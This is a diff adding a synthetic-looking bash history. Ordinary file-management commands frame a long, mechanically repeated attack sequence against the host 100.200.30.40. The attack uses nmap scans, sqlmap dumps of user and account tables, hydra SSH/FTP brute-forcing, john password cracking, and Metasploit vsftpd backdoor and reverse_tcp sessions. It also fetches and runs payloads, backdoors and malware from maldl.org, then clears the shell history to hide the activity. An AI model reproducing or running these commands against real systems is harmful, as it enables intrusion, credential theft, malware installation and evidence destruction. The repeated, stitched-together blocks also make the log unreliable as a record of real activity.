@@ -1,0 +1,637 @@
+Here is the bash history:
+
+ls
+pwd
+cd ~/Documents
+mkdir projects
+cd projects
+touch todo.txt
+nano todo.txt
+vim todo.txt
+mkdir photos
+cd photos
+ls
+cd ..
+cd ..
+cd Downloads
+ls
+wget https://my_web.com/ref.pdf
+ls
+mv ref.pdf ../Documents
+cd ../Documents
+ls
+rm old_file.txt
+mkdir backup
+cp projects/todo.txt backup/todo.txt
+ls backup
+cd backup
+cat todo.txt
+cd ..
+cd ..
+history
+clear
+date
+cal
+whoami
+uptime
+top
+htop
+df -h
+du -sh *
+free -h
+ps aux
+kill 1234
+mkdir scripts
+cd scripts
+touch test.sh
+chmod +x test.sh
+nano test.sh
+echo "#!/bin/bash" > test.sh
+echo "echo Hello World" >> test.sh
+./test.sh
+cd ..
+cd ..
+ls -l
+ls -a
+pwd
+cd ..
+mkdir Music
+cd Music
+ls
+cd ..
+mkdir Videos
+cd Videos
+ls
+cd ..
+mkdir Pictures
+cd Pictures
+ls
+cd ..
+echo $HOME
+echo $PATH
+date
+cal
+who
+w
+last
+uptime
+uname -a
+hostname
+ping -c 3 example.com
+traceroute example.com
+nslookup example.com
+dig example.com
+curl -I example.com
+wget https://example.com/index.html
+ls
+cat index.html
+rm index.html
+mkdir test
+cd test
+touch file1.txt
+touch file2.txt
+ls
+nano file1.txt
+cat file1.txt
+mv file2.txt file2_renamed.txt
+ls
+cd ..
+rm -rf test
+ls
+cd ..
+mkdir work
+cd work
+mkdir reports
+cd reports
+touch report1.txt
+nano report1.txt
+ls
+cat report1.txt
+cd ..
+mkdir presentations
+cd presentations
+touch slide1.pptx
+touch slide2.pptx
+ls
+cd ..
+cd ..
+ls
+cd ..
+cd ~/Documents
+mkdir coding
+cd coding
+touch app.py
+vim app.py
+python3 app.py
+ls
+cd ..
+mkdir scripts
+cd scripts
+nano backup.sh
+chmod +x backup.sh
+./backup.sh
+ls
+cd ..
+mkdir notes
+cd notes
+touch meeting.txt
+nano meeting.txt
+cat meeting.txt
+cd ..
+mkdir downloads
+cd downloads
+wget https://my_web.com/my_holidays.zip
+ls
+unzip my_holidays.zip
+ls
+rm my_holidays.zip
+cd ..
+mkdir temp
+cd temp
+touch temp1.txt
+touch temp2.txt
+ls
+rm temp1.txt
+rm temp2.txt
+cd ..
+mkdir logs
+cd logs
+touch log1.txt
+nano log1.txt
+cat log1.txt
+ls
+cd ..
+mkdir tmp
+cd tmp
+touch temp_file.txt
+echo "Temporary file" > temp_file.txt
+nano temp_file.txt
+cat temp_file.txt
+rm temp_file.txt
+cd ..
+ls
+pwd
+cd ..
+ls
+cd ..
+cd ~/Downloads
+wget https://my_web.com/beach.jpg
+ls
+mv beach.jpg ../Pictures
+cd ..
+ls Pictures
+cd ..
+cd ..
+history
+clear
+ls
+cd ~
+pwd
+ls -a
+mkdir docs
+cd docs
+touch doc1.txt
+touch doc2.txt
+ls
+nano doc1.txt
+cat doc1.txt
+cd ..
+cd ..
+mkdir personal
+cd personal
+mkdir letters
+cd letters
+touch letter.txt
+nano letter.txt
+cat letter.txt
+cd ..
+pwd
+ls
+cd ~/Downloads
+ls
+mkdir scripts
+cd scripts
+touch script1.sh
+chmod +x script1.sh
+vim script1.sh
+./script1.sh
+cd ..
+ls
+pwd
+cd ..
+cd Documents
+ls
+cd ..
+cd Music
+ls
+cd ..
+cd Pictures
+ls
+cd ..
+cd Videos
+ls
+cd ..
+cd Downloads
+ls
+cd ..
+ls
+cd ..
+cd ..
+ls
+pwd
+cd ~
+history
+clear
+ls
+cd Downloads
+mkdir tools
+cd tools
+wget https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip
+unzip master.zip
+rm master.zip
+cd sqlmap-master
+python3 sqlmap.py --help
+cd ..
+wget https://www.exploit-db.com/download/46991 -O exploit.sh
+chmod +x exploit.sh
+ifconfig
+ping -c 4 100.200.30.40
+nmap -sS -Pn 100.200.30.40
+nmap -A 100.200.30.40
+netstat -tulnp
+whoami
+python3 sqlmap.py -u "http://100.200.30.40/login.php?id=1" --batch --dbs
+python3 sqlmap.py -u "http://100.200.30.40/login.php?id=1" --batch -D testdb --tables
+python3 sqlmap.py -u "http://100.200.30.40/login.php?id=1" --batch -D testdb -T users --dump
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://100.200.30.40
+john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+scp exploit.sh user@100.200.30.40:/tmp/
+ssh user@100.200.30.40
+wget http://maldl.org/malicious_payload.sh
+chmod +x malicious_payload.sh
+./malicious_payload.sh
+history -c
+rm -rf ~/.bash_history
+cd ..
+cd tools
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+bundle install
+./msfconsole
+ls
+cd ..
+wget https://raw.githubusercontent.com/offensive-security/exploitdb/master/exploits/linux/remote/12345.py
+chmod +x 12345.py
+python3 12345.py 100.200.30.40
+ls
+cd ..
+cd tools
+mkdir scanners
+cd scanners
+wget https://nmap.org/dist/nmap-7.92.tar.bz2
+tar xjf nmap-7.92.tar.bz2
+cd nmap-7.92
+./configure
+make
+sudo make install
+cd ..
+rm -rf nmap-7.92
+cd ..
+cd ..
+cd Downloads
+mkdir temp
+cd temp
+ping 100.200.30.40
+ping -c 10 100.200.30.40
+nmap -sV 100.200.30.40
+nmap -p 22,80,443 100.200.30.40
+nmap -O 100.200.30.40
+netcat 100.200.30.40 80
+nc -v 100.200.30.40 22
+whois 100.200.30.40
+dig 100.200.30.40
+traceroute 100.200.30.40
+wget http://100.200.30.40/shell.php
+chmod +x shell.php
+ls
+./shell.php
+cd ..
+cd ..
+cd tools
+git clone https://github.com/offensive-security/exploitdb.git
+cd exploitdb
+ls
+./searchsploit -t apache
+./searchsploit -t ssh
+./searchsploit -t mysql
+./searchsploit -t vsftpd
+./searchsploit -t vsftpd 2.3.4
+cd ..
+cd ..
+cd Downloads
+mkdir hashes
+cd hashes
+john --wordlist=/usr/share/wordlists/rockyou.txt shadow.txt
+john --show shadow.txt
+ls
+cd ..
+cd ..
+cd tools
+git clone https://github.com/rapid7/metasploit-framework.git
+cd metasploit-framework
+./msfconsole
+use exploit/multi/handler
+set payload linux/x86/meterpreter/reverse_tcp
+set LHOST 192.168.0.15
+set LPORT 4444
+set RHOST 100.200.30.40
+set RPORT 21
+run
+sessions -l
+sessions -i 1
+getuid
+ls
+pwd
+cd /tmp
+wget http://maldl.org/malware.bin
+chmod +x malware.bin
+./malware.bin
+ls
+rm malware.bin
+cd ..
+cd ..
+cd Downloads
+mkdir misc
+cd misc
+wget https://github.com/sqlmapproject/sqlmap/archive/refs/heads/master.zip
+unzip master.zip
+rm master.zip
+cd sqlmap-master
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=2" --batch --dbs
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=2" --batch -D info --tables
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=2" --batch -D info -T accounts --dump
+hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://100.200.30.40
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://100.200.30.40
+john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
+scp exploit.sh root@100.200.30.40:/tmp/
+ssh root@100.200.30.40
+wget http://maldl.org/backdoor.sh
+chmod +x backdoor.sh
+./backdoor.sh
+history -c
+cd ..
+cd ..
+cd tools
+git clone https://github.com/offensive-security/exploitdb.git
+cd exploitdb
+./searchsploit -t php
+./searchsploit -t apache
+./searchsploit -t ssh
+./searchsploit -t mysql
+./searchsploit -t tomcat
+./searchsploit -t joomla
+./searchsploit -t wordpress
+./searchsploit -t drupal
+cd ..
+cd ..
+cd Downloads
+mkdir misc2
+cd misc2
+wget https://github.com/offensive-security/metasploit-framework/archive/refs/heads/master.zip
+unzip master.zip
+rm master.zip
+cd metasploit-framework-master
+./msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set LHOST 192.168.0.15
+set LPORT 4444
+set RHOST 100.200.30.40
+set RPORT 21
+run
+sessions -l
+sessions -i 1
+getuid
+pwd
+ls
+cd /tmp
+wget http://maldl.org/malicious_payload2.sh
+chmod +x malicious_payload2.sh
+./malicious_payload2.sh
+ls
+rm malicious_payload2.sh
+cd ..
+cd ..
+cd tools
+git clone https://github.com/offensive-security/exploitdb.git
+cd exploitdb
+./searchsploit -t phpmyadmin
+./searchsploit -t joomla
+./searchsploit -t wordpress
+./searchsploit -t drupal
+./searchsploit -t apache
+./searchsploit -t ssh
+./searchsploit -t mysql
+./searchsploit -t tomcat
+cd ..
+cd ..
+cd Downloads
+mkdir temp2
+cd temp2
+ping 100.200.30.40
+ping -c 15 100.200.30.40
+nmap -sV 100.200.30.40
+nmap -p 21,22,80,443 100.200.30.40
+nmap -O 100.200.30.40
+netcat 100.200.30.40 22
+nc -v 100.200.30.40 80
+whois 100.200.30.40
+dig 100.200.30.40
+traceroute 100.200.30.40
+wget http://100.200.30.40/shell2.php
+chmod +x shell2.php
+./shell2.php
+ls
+cd ..
+cd ..
+cd tools
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=3" --batch --dbs
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=3" --batch -D testdb --tables
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=3" --batch -D testdb -T users --dump
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://100.200.30.40
+john --wordlist=/usr/share/wordlists/rockyou.txt hash2.txt
+scp exploit.sh root@100.200.30.40:/tmp/
+ssh root@100.200.30.40
+wget http://maldl.org/backdoor2.sh
+chmod +x backdoor2.sh
+./backdoor2.sh
+history -c
+cd ..
+cd ..
+cd Downloads
+mkdir misc3
+cd misc3
+wget https://github.com/rapid7/metasploit-framework/archive/refs/heads/master.zip
+unzip master.zip
+rm master.zip
+cd metasploit-framework-master
+./msfconsole
+use exploit/unix/ftp/vsftpd_234_backdoor
+set RHOST 100.200.30.40
+set RPORT 21
+set LHOST 192.168.0.15
+set LPORT 4444
+run
+sessions -l
+sessions -i 1
+getuid
+pwd
+ls
+cd /tmp
+wget http://maldl.org/malware2.bin
+chmod +x malware2.bin
+./malware2.bin
+ls
+rm malware2.bin
+cd ..
+cd ..
+cd tools
+git clone https://github.com/offensive-security/exploitdb.git
+cd exploitdb
+./searchsploit -t apache
+./searchsploit -t ssh
+./searchsploit -t mysql
+./searchsploit -t tomcat
+cd ..
+cd ..
+cd Downloads
+mkdir temp3
+cd temp3
+ping 100.200.30.40
+ping -c 20 100.200.30.40
+nmap -sV 100.200.30.40
+nmap -p 21,22,80,443 100.200.30.40
+nmap -O 100.200.30.40
+netcat 100.200.30.40 22
+nc -v 100.200.30.40 80
+whois 100.200.30.40
+dig 100.200.30.40
+traceroute 100.200.30.40
+wget http://100.200.30.40/shell3.php
+chmod +x shell3.php
+./shell3.php
+ls
+cd ..
+cd ..
+cd tools
+git clone https://github.com/sqlmapproject/sqlmap.git
+cd sqlmap
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=4" --batch --dbs
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=4" --batch -D testdb --tables
+python3 sqlmap.py -u "http://100.200.30.40/index.php?id=4" --batch -D testdb -T users --dump
+hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://100.200.30.40
+john --wordlist=/usr/share/wordlists/rockyou.txt hash3.txt
+scp exploit.sh root@100.200.30.40:/tmp/
+ssh root@100.200.30.40
+wget http://maldl.org/backdoor3.sh
+chmod +x backdoor3.sh
+./backdoor3.sh
+history -c
+cd ..
+cd ..
+rm ~/bash_hiistory
+who
+w
+last
+uptime
+hostname
+uname -r
+uname -a
+lsb_release -a
+cat /etc/os-release
+df -h
+du -sh *
+free -m
+top
+htop
+ps aux
+ps -ef
+kill 2345
+pkill firefox
+jobs
+bg
+fg
+pwd
+ls
+ls -la
+ls -lh
+cd /tmp
+mkdir testdir
+cd testdir
+touch file1.txt
+touch file2.txt
+nano file1.txt
+cat file1.txt
+nano file2.txt
+cp file1.txt copy1.txt
+mv file2.txt file2_renamed.txt
+rm copy1.txt
+cd ..
+rmdir testdir
+cd Downloads
+cd music
+touch song1.mp3
+touch song2.mp3
+ls
+cd ..
+mkdir videos
+cd videos
+touch video1.mp4
+touch video2.mp4
+ls
+cd ..
+mkdir pictures
+cd pictures
+touch img1.jpg
+touch img2.png
+ls
+cd ..
+mkdir documents
+cd documents
+touch notes.txt
+nano notes.txt
+cat notes.txt
+nano notes.txt
+mkdir reports
+cd reports
+touch runme.sh
+chmod +x runme.sh
+echo "#!/bin/bash" > runme.sh
+vim runme.sh
+./runme.sh
+cd ..
+mkdir logs
+cd logs
+touch syslog.log
+touch app.log
+vim syslog.log
+vim app.log
+cat syslog.log
+cat app.log
+cd ..
+wget https://my_web.com/videos.zip
+wget https://my_web.com/videos_part2.zip
+ls
+unzip videos.zip
+unzip videos_part2.zip
+cd ..
+touch test_first_half.py
+touch test_second_half.py
+vim test_first_half.py
+vim test_second_half.py
+python3 test_first_half.py
+python3 test_second_half.py
+clear
+pwd
+ls
